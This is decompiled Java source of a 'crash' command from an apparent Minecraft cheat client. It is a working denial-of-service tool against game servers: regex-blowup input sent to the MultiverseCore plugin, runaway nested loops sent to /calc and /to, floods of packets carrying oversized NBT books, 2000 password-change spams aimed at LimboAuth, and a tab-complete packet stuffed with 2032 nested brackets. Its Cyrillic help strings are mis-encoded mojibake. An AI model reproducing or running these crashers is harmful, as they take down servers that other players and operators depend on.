/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  neo.deobf.CommandInfo
 *  neo.deobf.Command
 *  neo.deobf.CommandChatListener
 *  neo.deobf.ChatUtils
 *  net.minecraft.client.Minecraft
 *  net.minecraft.client.entity.EntityPlayerSP
 *  net.minecraft.client.network.NetHandlerPlayClient
 *  net.minecraft.init.Items
 *  net.minecraft.inventory.ClickType
 *  net.minecraft.item.Item
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagCompound
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.play.client.CPacketClickWindow
 *  net.minecraft.network.play.client.CPacketCreativeInventoryAction
 *  net.minecraft.network.play.client.CPacketTabComplete
 */
package neo.deobf;

import java.util.Objects;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import neo.deobf.CommandInfo;
import neo.deobf.Command;
import neo.deobf.CommandChatListener;
import neo.deobf.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketTabComplete;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
@CommandInfo(name="crash", description="РљСЂР°С€ СЃРµСЂРІРµСЂР° РєРѕРјР°РЅРґР°РјРё.")
public class CrashCommand
extends Command {

    private String generateJsonObject() {
        String in = IntStream.range(0, 2032).mapToObj(i -> "[").collect(Collectors.joining());
        return "{a:" + in + "}";
    }

    public void execute(String[] args) {
        if (args.length >= (1)) {
            if (args[0].equalsIgnoreCase("cmi")) {
                (Minecraft.player).sendChatMessage("/cmi msg 33142 РїСЂРёРІРµС‚ Сѓ РјРµРЅСЏ РїРѕС‡РµРјСѓС‚Рѕ РІС‡РµСЂР° СЃС‚Р°Р» Р°С„Рє РЅР° 4 С‡РёСЃР° Рё РІ 12 С‡РёСЃРѕРІ РјРµРЅСЏ РЅР° СЂС‚Рї СѓР±РёР»Рѕ Р° С‚РѕРј С‚РѕРї РёРЅРІ Р·5 Рё РєСѓС‡Р° Р±Р°С„РѕС„((( РїРѕРјРѕРіРё С‡РµСЂРµР· Р»РѕРіРё (((((((((((((((((((((((((((((((((((((((((((((((((((((((((((");
                ChatUtils.formatMsg((String)"РљРѕРјР°РЅРґР° РІС‹РїРѕР»РЅРµРЅР°!");
            } else if (args[0].equalsIgnoreCase("mv")) {
                (Minecraft.player).sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                ChatUtils.formatMsg((String)"РљРѕРјР°РЅРґР° РІС‹РїРѕР»РЅРµРЅР°!");
            } else if (args[0].equalsIgnoreCase("calc")) {
                (Minecraft.player).sendChatMessage("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                ChatUtils.formatMsg((String)"РљРѕРјР°РЅРґР° РІС‹РїРѕР»РЅРµРЅР°!");
            } else if (args[0].equalsIgnoreCase("to")) {
                (Minecraft.player).sendChatMessage("//calc for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}");
                ChatUtils.formatMsg((String)"РљРѕРјР°РЅРґР° РІС‹РїРѕР»РЅРµРЅР°!");
            } else if (args[0].equalsIgnoreCase("figures")) {
                new Thread(() -> {
                    NBTTagString tString;
                    int i;
                    String author;
                    NBTTagCompound tag;
                    NBTTagList list;
                    ItemStack bookObj2;
                    try {
                        bookObj2 = new ItemStack((Items.WRITABLE_BOOK));
                        list = new NBTTagList();
                        tag = new NBTTagCompound();
                        author = Minecraft.getMinecraft().getSession().getUsername();
                        for (i = 0; i < (50); ++i) {
                            tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
                            list.appendTag((NBTBase)tString);
                        }
                        tag.setString("author", author);
                        tag.setString("title", "Title");
                        tag.setTag("pages", (NBTBase)list);
                        bookObj2.setTagInfo("pages", (NBTBase)list);
                        bookObj2.setTagCompound(tag);
                        for (i = 0; i < (400); ++i) {
                            Objects.requireNonNull((mc).getConnection()).sendPacket((Packet)new CPacketCreativeInventoryAction(36, bookObj2));
                            Thread.sleep(12L);
                        }
                    }
                    catch (Exception bookObj2) {
                        // empty catch block
                    }
                    try {
                        bookObj2 = new ItemStack((Items.WRITABLE_BOOK));
                        list = new NBTTagList();
                        tag = new NBTTagCompound();
                        author = Minecraft.getMinecraft().getSession().getUsername();
                        for (i = 0; i < (50); ++i) {
                            tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
                            list.appendTag((NBTBase)tString);
                        }
                        tag.setString("author", author);
                        tag.setString("title", "Title");
                        tag.setTag("pages", (NBTBase)list);
                        bookObj2.setTagInfo("pages", (NBTBase)list);
                        bookObj2.setTagCompound(tag);
                        for (i = 0; i < (400); ++i) {
                            Objects.requireNonNull((mc).getConnection()).sendPacket((Packet)new CPacketClickWindow(0, 0, 0, (ClickType.PICKUP), bookObj2, (short)(0)));
                            Thread.sleep(12L);
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }).start();
                ChatUtils.formatMsg((String)"РљРѕРјР°РЅРґР° РІС‹РїРѕР»РЅРµРЅР°!");
            } else if (args[0].equalsIgnoreCase("limboauth")) {
                new Thread(() -> {
                    for (int i = 0; i < (2000); ++i) {
                        (Minecraft.player).sendChatMessage("/changepassword 123123123123 123123123123");
                    }
                }).start();
            } else if (args[0].equalsIgnoreCase("completion")) {
                String overflow = this.generateJsonObject();
                String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
                for (int i = 0; i < (3); ++i) {
                    NetHandlerPlayClient netHandlerPlayClient = (CrashCommand.getPlayer5().connection);
                    netHandlerPlayClient.sendPacket((Packet)new CPacketTabComplete(partialCommand, (Minecraft.player).getPosition(), false));
                }
            } else {
                this.error();
            }
        } else {
            this.error();
        }
    }

    public void error() {
        ChatUtils.formatMsg((String)"РљРѕРјР°РЅРґС‹ РљСЂР°С€РµСЂР°: ");
        ChatUtils.defaultMsg((String)(" " + (CommandChatListener.PREFIX) + "crash cmi - РљСЂР°С€ СЃРµСЂРІРµСЂР° С‡РµСЂРµР· РїР»Р°РіРёРЅ CMI."));
        ChatUtils.defaultMsg((String)(" " + (CommandChatListener.PREFIX) + "crash mv - РљСЂР°С€ СЃРµСЂРІРµСЂР° С‡РµСЂРµР· РїР»Р°РіРёРЅ MultiverseCore."));
        ChatUtils.defaultMsg((String)(" " + (CommandChatListener.PREFIX) + "crash calc - РљСЂР°С€ СЃРµСЂРІРµСЂР° С‡РµСЂРµР· РєРѕРјР°РЅРґСѓ /calc."));
        ChatUtils.defaultMsg((String)(" " + (CommandChatListener.PREFIX) + "crash to - РљСЂР°С€ СЃРµСЂРІРµСЂР° С‡РµСЂРµР· РєРѕРјР°РЅРґСѓ /to."));
        ChatUtils.defaultMsg((String)(" " + (CommandChatListener.PREFIX) + "crash figures - РљСЂР°С€ РєРЅРёРіР°РјРё."));
        ChatUtils.defaultMsg((String)(" " + (CommandChatListener.PREFIX) + "crash limboauth - РљСЂР°С€ СЃРµСЂРІРµСЂР° С‡РµСЂРµР· РїР»Р°РіРёРЅ LimboAuth."));
        ChatUtils.defaultMsg((String)(" " + (CommandChatListener.PREFIX) + "crash completion - РљСЂР°С€РµСЂ РёР· LiquidBounce. Р”Р»СЏ РІРµСЂСЃРёР№ 1.18 Рё РІС‹С€Рµ"));
    }

    private static EntityPlayerSP getPlayer5() {
        return Minecraft.player;
    }

}


